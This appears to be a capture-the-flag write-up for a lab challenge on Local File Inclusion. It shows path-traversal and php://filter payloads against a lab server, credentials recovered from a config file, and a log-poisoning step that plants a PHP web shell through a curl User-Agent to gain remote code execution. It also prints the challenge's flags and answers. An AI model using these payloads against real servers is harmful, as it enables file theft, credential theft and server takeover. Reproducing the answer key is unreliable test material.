---
title: Patch Management Is Hard (Day 6)
sidebar_position: 7
---
## Topic: Web Exploitation
Challenge is an introduction on Local File Inclusion (LFI) vulnerabilities. 

LFI to read flag is just simply replace `error.txt` in the url on the homepage to `/etc/flag`.  
Reading the `index.php` flag is harder using php filter technique. `http://10.10.244.228/index.php?err=php://filter/convert.base64-encode/resource=index.php` then base 64 decode the result on the webpage to read the flag and source code.  
See in sourcecode that its grabbing credentials from `./includes/creds.php`  
![[Pasted image 20211220174815.png]]

Look at that file by using our earlier php filter technique.  
url: `http://10.10.244.228/index.php?err=php://filter/convert.base64-encode/resource=./includes/creds.php`  
Find credentials:
```
<?php 
$USER = "McSkidy";
$PASS = "A0C315Aw3s0m";
```
app_access.log has a parameter RCE that allows us to execute code. 
command to get RCE: `curl -A "<?php echo 'test'; system(\$_GET['cmd']);?>" http://10.10.104.42/`  
url to perform RCE: `http://10.10.104.42/index.php?err=../../../../../../var/www/html/includes/logs/app_access.log&cmd=hostname`  
### Questions:

1. Deploy the attached VM and look around. What is the entry point for our web application?  
 `err`  
2. Use the entry point to perform LFI to read the /etc/flag file. What is the flag?  
url: `http://10.10.244.228/index.php?err=/etc/flag`  
flag: `THM{d29e08941cf7fe41df55f1a7da6c4c06}`  
3. Use the PHP filter technique to read the source code of the index.php. What is the $flag variable's value?  
url:`http://10.10.244.228/index.php?err=php://filter/convert.base64-encode/resource=index.php`  
flag:`THM{791d43d46018a0d89361dbf60d5d9eb8}`  
4. Now that you read the index.php, there is a login credential PHP file's path. Use the PHP filter technique to read its content. What are the username and password?  
url: `http://10.10.244.228/index.php?err=php://filter/convert.base64-encode/resource=./includes/creds.php`  
answer: `McSkidy:A0C315Aw3s0m`  
5. Use the credentials to login into the web application. Help McSkidy to recover the server's password. What is the password of the flag.thm.aoc server?  
flag: `THM{552f313b52e3c3dbf5257d8c6db7f6f1}`  
6. The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver? The log file location is at ./includes/logs/app_access.log.  
url:`http://10.10.244.228/index.php?err=php://filter/convert.base64-encode/resource=./includes/logs/app_access.log`  
answer:`lfi-aoc-awesome-59aedca683fff9261263bb084880c965`  